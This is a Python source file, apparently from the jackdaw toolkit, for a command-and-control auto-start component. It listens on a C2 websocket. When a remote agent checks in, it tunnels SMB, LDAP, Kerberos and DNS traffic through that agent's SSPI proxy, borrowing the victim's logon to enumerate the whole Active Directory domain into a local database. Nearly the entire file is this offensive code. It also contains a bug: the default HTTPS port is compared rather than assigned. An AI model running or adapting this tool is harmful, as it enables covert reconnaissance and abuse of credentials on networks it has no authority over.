
import asyncio
import os
import traceback
from urllib.parse import urlparse, parse_qs
import multiprocessing
import pathlib
import datetime

from jackdaw.dbmodel import create_db, get_session
from jackdaw.gatherer.gatherer import Gatherer

import websockets
from pyodidewsnet.protocol import OPCMD, CMD, WSNOK, CMDType, WSNSocketData, WSNConnect

# this is a pyodide module to access javascript objects
#from js import wsnet
#import js


class C2AutoStart:
	def __init__(self, c2url, workdir = None):
		self.c2url = c2url
		self.workdir = workdir
		self.ws = None
		self.c2_ip = None
		self.c2_port = None
		self.c2_proto = None

	async def setup(self):
		if self.workdir is None:
			self.workdir = str(pathlib.Path.cwd())
		o = urlparse(self.c2url)
		print(o)
		self.c2_proto = o.scheme
		self.c2_ip = o.hostname
		self.c2_port = o.port
		if self.c2_port is None:
			if self.c2_proto == 'ws':
				self.c2_port = 80
			else:
				self.c2_port == 443
		
		print(self.c2_proto)
		print(self.c2_ip)
		print(self.c2_port)


	async def __start_cmd(self, cmd):
		try:
			print('starting!')
			print(cmd.to_dict())

			wsproto = 'wsnetws' if self.c2_proto == 'ws' else 'wsnetwss'
			domain = cmd.domain
			username = cmd.username
			if username.find('\\') != -1:
				domain, username = username.split('\\')
			
			dns_url = 'dns://%s:53/?proxytype=%s&proxyhost=%s&proxyport=%s&proxyagentid=%s' % (cmd.logonserver, wsproto, self.c2_ip, self.c2_port, cmd.agentid.hex())
			kerberos_url = '%s://%s:%s/?type=sspiproxy&agentid=%s' % (self.c2_proto, self.c2_ip, self.c2_port, cmd.agentid.hex())
			params = 'authhost=%s&authport=%s&authagentid=%s&proxytype=%s&proxyhost=%s&proxyport=%s&proxyagentid=%s' % ( self.c2_ip, self.c2_port, cmd.agentid.hex(), wsproto, self.c2_ip, self.c2_port, cmd.agentid.hex())
			smb_url = 'smb2+sspiproxy-ntlm://%s\\%s:aa@%s/?%s' % (domain, username, cmd.logonserver, params)
			ldap_url = 'ldap+sspiproxy-ntlm://%s\\%s:aa@%s/?%s' % (domain, username, cmd.logonserver, params)

			print('dns %s' % dns_url)
			print('kerberos %s' % kerberos_url)
			print('smb %s' % smb_url)
			print('ldap %s' % ldap_url)

			smb_workers = 10
			ldap_workers = 4

			db_loc = '%s_%s.db' % (cmd.domain, datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
			db_loc = pathlib.Path(self.workdir).joinpath(db_loc)
			db_conn = 'sqlite:///%s' % db_loc
			create_db(db_conn)

			p = pathlib.Path(self.workdir).joinpath('./workdir_' + datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
			p.mkdir(parents=True, exist_ok=True)
			work_dir = str(p)

			print(work_dir)
			print(db_conn)
			#return

			with multiprocessing.Pool() as mp_pool:
				gatherer = Gatherer(
					db_conn, 
					work_dir, 
					ldap_url, 
					smb_url,
					kerb_url=kerberos_url,
					ldap_worker_cnt=ldap_workers, 
					smb_worker_cnt=smb_workers, 
					mp_pool=mp_pool, 
					smb_gather_types=['all'],
					progress_queue=None, 
					show_progress=True,
					calc_edges=True,
					ad_id=None,
					dns=dns_url,
					no_work_dir=False
				)
				res, err = await gatherer.run()
				if err is not None:
					raise err

			

		except Exception as e:
			print(e)

	async def run(self):
		try:
			await self.setup()

			self.ws = await websockets.connect(self.c2url)
			while True:
				try:
					data = await self.ws.recv()
					print(data)
					cmd = CMD.from_bytes(data)
					print(cmd)
					print(cmd.type)
					print(cmd.type == CMDType.AGENTINFO)
					if cmd.type == CMDType.AGENTINFO:
						print('agent in!')
						asyncio.create_task(self.__start_cmd(cmd))
					


				except Exception as e:
					print('exception!')
					print(e)
					break

		except Exception as e:
			print(e)


async def amain(url):
	auto = C2AutoStart(url)
	await auto.run()


def main():
	import argparse
	import platform
	import logging
	
	parser = argparse.ArgumentParser(description='Interactive SMB client')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('url', help = 'url')
	
	args = parser.parse_args()

	asyncio.run(amain(args.url))

if __name__ == '__main__':
	main()